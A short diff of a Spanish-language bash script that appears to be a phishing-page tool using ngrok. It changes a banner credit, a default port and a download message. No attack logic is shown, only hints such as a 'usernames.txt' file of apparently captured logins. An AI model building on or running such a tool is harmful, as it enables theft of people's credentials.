@@ -238,7 +238,7 @@ printf "    .-----.----.----.-----.----.   |   Y   |   _   |   Y   |      \n"
 printf "    |  -__|   _|   _|  _  |   _|   |   |   |.  |   |   |   |     \n"
 printf "    |_____|__| |__| |_____|__|     |____   |.  |   |____   |     \n"
 printf "                                       |:  |:  1   |   |:  |    \n"
-printf "     \e[0m\e[1;77m Mod Andres   \e[1;31m                |::.|::.. . |   |::.|    \n"
+printf "     \e[0m\e[1;77m Sploid Andres \e[1;31m                |::.|::.. . |   |::.|    \n"
 printf "                                        --- -------     ---     \n"
                                           
 printf "\n"
@@ -390,7 +390,7 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
+default_port="8000" #$(seq 1111 4444 | sort -R | head -n1)
 printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escojer un puerto (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
@@ -416,7 +416,7 @@ echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "Necesita unzip pero no está instalado. Instalarlo. Saliendo."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "Necesita wget pero no está instalado. Instalarlo. Saliendo."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Descargando Ngrok...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] Descargando ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
